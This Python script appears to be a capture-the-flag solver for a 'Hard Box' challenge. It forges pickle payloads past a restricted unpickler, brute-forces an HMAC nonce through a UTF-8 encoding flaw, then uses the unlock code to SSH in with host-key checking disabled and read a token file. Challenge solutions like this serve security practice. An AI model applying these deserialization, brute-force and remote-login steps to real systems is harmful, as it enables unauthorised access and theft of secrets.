#!/usr/bin/env python3
"""
Solution for the Hard Box — restricted pickle deserialization challenge.

The server uses a RestrictedUnpickler that only allows:
  builtins  : int, str, bytes, dict, list, tuple, bool, set, frozenset, type, object
  copyreg   : _reconstructor, __newobj__
  collections: OrderedDict
  payload_base: ChallengePayload

Strategy:
  1. Pickle a payload_base.ChallengePayload instance with marker='nech' and
     a chosen nonce.
  2. The class's run() method computes HMAC-SHA256(secret, str(nonce)) and
     returns the first 6 raw bytes decoded as latin-1.
  3. The server's verify compares provided_raw.encode('utf-8')[:6] against
     the first 6 raw HMAC bytes.  Because UTF-8 expands bytes >= 0x80 to
     two bytes, the match only succeeds when all 6 HMAC bytes are < 0x80.
  4. We brute-force nonce values until one works (probability per nonce
     ≈ (128/256)^6 ≈ 1.6 %, so ~64 tries on average).
"""

from __future__ import annotations
import argparse
import base64
import pickle
import hmac
import hashlib
import subprocess
import sys
import time
from typing import Tuple
from urllib.parse import urlparse

try:
    import requests
except ImportError:
    print("Missing dependency: requests.  Install with: pip install requests")
    raise SystemExit(1)

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False


# ---------------------------------------------------------------------------
# Mirror of the server-side class so pickle produces the right GLOBAL opcode.
# The actual run() logic lives on the server; we only need the constructor
# to set marker and nonce.
# ---------------------------------------------------------------------------
import importlib, types

# ---------------------------------------------------------------------------
# Create a fake 'payload_base' module so pickle emits the GLOBAL opcode
# referencing payload_base.ChallengePayload (which the server allows).
# The class must be defined at module level with __qualname__ set correctly
# so that pickle can resolve it.
# ---------------------------------------------------------------------------
_payload_base_mod = types.ModuleType("payload_base")

class ChallengePayload:
    def __init__(self, marker=None, nonce=None):
        self.marker = marker
        self.nonce = nonce

ChallengePayload.__module__ = "payload_base"
ChallengePayload.__qualname__ = "ChallengePayload"
_payload_base_mod.ChallengePayload = ChallengePayload
sys.modules["payload_base"] = _payload_base_mod


def build_payload(nonce: int) -> str:
    """Return a base64-encoded pickle of ChallengePayload(marker='nech', nonce=nonce)."""
    obj = ChallengePayload(marker="nech", nonce=nonce)
    raw = pickle.dumps(obj, protocol=2)
    return base64.b64encode(raw).decode()


def send(target: str, payload_b64: str, timeout: float = 15.0) -> Tuple[int, dict | str]:
    url = target.rstrip("/") + "/serialize"
    resp = requests.post(url, data=payload_b64,
                         headers={"Content-Type": "application/octet-stream"},
                         timeout=timeout)
    try:
        return resp.status_code, resp.json()
    except Exception:
        return resp.status_code, resp.text


def ssh_grab_token(host: str, port: int, password: str) -> str | None:
    """Try to SSH in and read the token."""
    if PARAMIKO_AVAILABLE:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname=host, port=port, username="user",
                           password=password, timeout=10)
            _, stdout, _ = client.exec_command("cat /home/user/token.txt", timeout=10)
            token = stdout.read().decode(errors="replace").strip()
            client.close()
            return token
        except Exception as e:
            print(f"[!] paramiko error: {e}")
    from shutil import which
    if which("sshpass"):
        try:
            p = subprocess.run(
                ["sshpass", "-p", password, "ssh",
                 "-o", "StrictHostKeyChecking=no",
                 "-p", str(port), f"user@{host}",
                 "cat /home/user/token.txt"],
                capture_output=True, timeout=15)
            if p.returncode == 0:
                return p.stdout.decode(errors="replace").strip()
        except Exception as e:
            print(f"[!] sshpass error: {e}")
    return None


def main():
    ap = argparse.ArgumentParser(description="Hard Box solver — restricted pickle + HMAC nonce brute-force")
    ap.add_argument("--target", required=True, help="Base URL, e.g. http://hardbox")
    ap.add_argument("--max-tries", type=int, default=500, help="Max nonces to try")
    ap.add_argument("--no-ssh", action="store_true", help="Skip SSH step")
    args = ap.parse_args()

    target = args.target.rstrip("/")
    print(f"[*] Target: {target}")
    print("[*] Brute-forcing nonce (need HMAC first-6 bytes all < 0x80) ...")

    for nonce in range(args.max_tries):
        payload = build_payload(nonce)
        code, body = send(target, payload)

        if code == 403 and isinstance(body, dict) and body.get("error") == "token already used":
            print("[!] Token already used — the box was already exploited.")
            sys.exit(1)

        if code == 200 and isinstance(body, dict) and body.get("status") == "ok":
            unlock = body["unlock_code"]
            print(f"[+] Success at nonce={nonce}!")
            print(f"[+] Unlock code: {unlock}")

            if args.no_ssh:
                sys.exit(0)

            host = urlparse(target).hostname or "localhost"
            token = ssh_grab_token(host, 22, unlock)
            if token:
                print(f"[+] Token: {token}")
            else:
                print(f"[*] SSH failed. Connect manually:  ssh user@{host}")
                print(f"    Password: {unlock}")
            sys.exit(0)

        # nonce didn't work (rejected or HMAC mismatch) — try next
        if nonce % 50 == 0 and nonce > 0:
            print(f"    ... tried {nonce} nonces so far")

    print(f"[!] Exhausted {args.max_tries} nonces without success.")
    sys.exit(2)


if __name__ == "__main__":
    main()
